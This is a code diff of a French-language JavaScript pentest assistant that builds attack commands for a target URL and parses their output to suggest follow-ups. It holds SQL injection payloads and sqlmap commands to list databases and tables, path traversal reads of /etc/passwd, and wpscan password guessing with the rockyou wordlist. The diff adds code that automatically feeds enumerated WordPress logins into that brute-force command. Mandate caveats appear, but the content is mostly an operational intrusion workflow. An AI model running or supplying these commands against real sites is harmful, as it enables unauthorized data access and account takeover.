@@ -270,7 +270,7 @@ rce:[
 sqli:[
  {t:"Détection manuelle", c:`curl -s "${U}/?${P}=1'"\ncurl -s "${U}/?${P}=1' OR '1'='1"\ncurl -s "${U}/?${P}=1 ORDER BY 5-- -"`, e:`Erreur SQL / comportement qui change = injectable. ORDER BY trouve le nb de colonnes.`},
  {t:"sqlmap (auto, prudent)", c:`sqlmap -u "${U}/?${P}=1" -p ${P} --batch --level=3 --risk=2 --random-agent --delay=1`, e:`Confirme + exploite. Sur prod : risk=1. Authentifié : ajoute <code>--cookie="..."</code>.`},
- {t:"Extraction (si confirmé)", c:`sqlmap -u "${U}/?${P}=1" -p ${P} --batch --dbs\nsqlmap -u "${U}/?${P}=1" -p ${P} --batch -D <db> --tables`, e:`Prouve l'impact (liste bases/tables). Ne PAS dumper de vraies données perso.`}
+ {t:"Extraction (si confirmé)", c:`sqlmap -u "${U}/?${P}=1" -p ${P} --batch --dbs\nsqlmap -u "${U}/?${P}=1" -p ${P} --batch -D NOM_BASE --tables`, e:`Prouve l'impact (liste bases/tables). Ne PAS dumper de vraies données perso.`}
 ],
 lfi:[
  {t:"Traversal basique", c:`curl -s "${U}/?${P}=../../../../etc/passwd"\ncurl -s "${U}/?${P}=....//....//etc/passwd"`, e:`Si tu vois <code>root:x:0:0</code> → LFI confirmée. <code>....//</code> contourne certains filtres.`},
@@ -696,7 +696,7 @@ function scan(t){
     report:{type:'lfi',payload:'../../../../etc/passwd'}, unlock:'file'};
   // SQLi (sqlmap)
   if(/is vulnerable|available databases|back-end DBMS|sqlmap identified|Parameter:.*\((GET|POST)\)/i.test(t)) return {cls:'ok',msg:'💉 SQLi CONFIRMÉE — tu peux entrer dans la base. Panneau ③ ouvert ci-dessus.',
-    follow:[{t:'Lister les tables d\'une base',c:'sqlmap -u "'+U+'/?'+P+'=1" -p '+P+' --batch -D <base> --tables',e:'Repère la table clients/users, puis extrais dans le panneau ③.'}],
+    follow:[{t:'Lister les tables d\'une base',c:'sqlmap -u "'+U+'/?'+P+'=1" -p '+P+' --batch -D NOM_BASE --tables',e:'Repère la table clients/users, puis extrais dans le panneau ③.'}],
     report:{type:'sqli',payload:"1' OR '1'='1"}, unlock:'sqli'};
   // Write non-auth (kalelia / Rank Math)
   if(/\{"slug":"\/","schemas":\[\]\}/.test(t) || (/\b200\b/.test(t) && /rank_math|updateMeta|objectID/i.test(t))) return {cls:'ok',msg:'🖊️ WRITE NON AUTHENTIFIÉ confirmé (changement accepté sans login). Preuve de modification.',
@@ -734,10 +734,15 @@ function scan(t){
   if(/wpscan|\[\+\]|User\(s\) Identified|\[i\] User|Identified the following|WordPress version \d/i.test(t)){
     var foll=[], msg='🧩 Sortie wpscan lue.';
     if(/User\(s\) Identified|\[i\] User|Author\(s\) Identified/i.test(t)){
-      msg+=' Comptes énumérés → test de mot de passe faible possible (sous mandat).';
-      foll.push({t:'Test de mots de passe sur les comptes trouvés (sous mandat)',c:'wpscan --url '+U+' --usernames <user1,user2> --passwords /usr/share/wordlists/rockyou.txt --max-threads 5 --throttle 800',e:'Prouve un accès admin si mot de passe faible (ACTIF, mandat obligatoire, risque de verrouillage). Un compte admin cassé = impact critique. Colle la sortie → Analyser (ne rebouclera pas).'});
+      // Extraire les VRAIS logins listés sous « User(s) Identified » (plus de placeholder <user1,user2>)
+      var blockU=(t.split(/User\(s\) Identified/i)[1]||'').split(/\n\s*\[[i!]\]/)[0]||'';
+      var usr=(blockU.match(/^\s*\[\+\]\s+(.+?)\s*$/mg)||[]).map(function(x){return x.replace(/^\s*\[\+\]\s+/,'').trim();}).filter(Boolean);
+      var logins=usr.filter(function(u){return /^[A-Za-z0-9._@-]+$/.test(u);}); // sans espace = vrai login utilisable
+      var unameArg=logins.length? (' --usernames '+logins.slice(0,8).join(',')) : '';
+      msg+=' Comptes énumérés'+(usr.length?' : '+usr.slice(0,6).join(', '):'')+' → test de mot de passe faible possible (sous mandat).';
+      foll.push({t:'Test de mots de passe sur les comptes trouvés (sous mandat)',c:'wpscan --url '+U+unameArg+' --passwords /usr/share/wordlists/rockyou.txt --max-threads 5 --throttle 800',e:'Prouve un accès admin si mot de passe faible (ACTIF, mandat obligatoire, risque de verrouillage). Un compte admin cassé = impact critique.'+(logins.length?' Logins injectés automatiquement.':' (Sans --usernames : wpscan ré-énumère les comptes lui-même.)')+' Colle la sortie → Analyser (ne rebouclera pas).'});
     }
-    if(/vulnerabilit|CVE-|\[!\]|Title:/i.test(t)){ msg+=' Plugins/thèmes vulnérables signalés → vérifie la CVE + un exploit public (searchsploit).'; foll.push({t:'Chercher un exploit pour une CVE trouvée',c:'searchsploit <plugin> <version>',e:'Confirme si la vulnérabilité a un exploit prêt à l\'emploi.'}); }
+    if(/vulnerabilit|CVE-|\[!\]|Title:/i.test(t)){ msg+=' Plugins/thèmes vulnérables signalés → vérifie la CVE + un exploit public (searchsploit).'; foll.push({t:'Chercher un exploit pour une CVE trouvée',c:'searchsploit NOM_PLUGIN VERSION   # ex: searchsploit contact-form-7 5.7  (remplace par le plugin+version trouvés, SANS chevrons)',e:'Confirme si la vulnérabilité a un exploit prêt à l\'emploi. Remplace NOM_PLUGIN et VERSION par les valeurs trouvées.'}); }
     return {cls:'ok',msg:msg,follow:foll,report:(/User\(s\) Identified|\[i\] User/i.test(t)?{type:'enum'}:null),unlock:null};
   }
   // Comptes WordPress énumérés via REST (/wp-json/wp/v2/users) ou ?author= — login exposé
@@ -748,7 +753,7 @@ function scan(t){
     us=us.filter(function(v,i){return v && us.indexOf(v)===i;});
     var um='👤 '+us.length+' compte(s) énuméré(s)'+(us.length?' : '+us.slice(0,8).join(', ')+(us.length>8?'…':''):'')+'. Le LOGIN de connexion est exposé publiquement = preuve forte (donnée non censée être publique). Ce n\'est PAS encore un accès : il faut le mot de passe pour entrer → étape suivante.';
     return {cls:'ok',msg:um,
-      follow:[{t:'Test de mots de passe sur ce(s) compte(s) (ACTIF, sous mandat)',c:'wpscan --url '+U+' --usernames '+(us.slice(0,5).join(',')||'<user>')+' --passwords /usr/share/wordlists/rockyou.txt --max-threads 5 --throttle 800',e:'Si un mot de passe est faible → accès prouvé (compte admin cassé = impact critique). ACTIF = mandat obligatoire + risque de verrouillage. Si rien ne casse : le login exposé reste une faille d\'énumération à mettre au rapport.'},
+      follow:[{t:'Test de mots de passe sur ce(s) compte(s) (ACTIF, sous mandat)',c:'wpscan --url '+U+' --usernames '+(us.slice(0,5).join(',')||'LOGIN')+' --passwords /usr/share/wordlists/rockyou.txt --max-threads 5 --throttle 800',e:'Si un mot de passe est faible → accès prouvé (compte admin cassé = impact critique). ACTIF = mandat obligatoire + risque de verrouillage. Si rien ne casse : le login exposé reste une faille d\'énumération à mettre au rapport.'},
               {t:'Fermer la fuite (remédiation à vendre)',c:'# Bloquer l\'énumération : REST users sur auth only + redirection ?author=\n# (plugin de durcissement ou règle serveur)',e:'Masquer les logins = première ligne de durcissement facturable.'}],
       report:{type:'enum'}, unlock:null};
   }
@@ -779,7 +784,7 @@ function scan(t){
     var m='🧪 Endpoints testés : '+ok200.length+' en 200 (accessibles), '+prot.length+' protégés (401/403).';
     var fol=[];
     if(apiOpen.length){ m+=' ⚠️ '+apiOpen.length+' endpoint(s) /api répondent 200 — à vérifier SANS session (fuite de données / contrôle d\'accès cassé).';
-      fol.push({t:'Rejouer un /api 200 SANS cookie ni token (preuve)',c:'curl -s -i -A "Mozilla/5.0" "'+U+'/<route_api_200>"   # aucun cookie/Authorization',e:'Si des données privées reviennent sans session → accès non authentifié (BAC). Compare avec/sans cookie. Preuve pour le rapport (panneau ③).'}); }
+      fol.push({t:'Rejouer un /api 200 SANS cookie ni token (preuve)',c:'curl -s -i -A "Mozilla/5.0" "'+U+'/ROUTE_API_200"   # aucun cookie/Authorization',e:'Si des données privées reviennent sans session → accès non authentifié (BAC). Compare avec/sans cookie. Preuve pour le rapport (panneau ③).'}); }
     else if(ok200.length){ m+=' → regarde si un 200 touche une ressource sensible (export, admin, config).'; }
     return {cls:(apiOpen.length?'ok':'warn'),msg:m,follow:fol,report:null,unlock:null};
   }
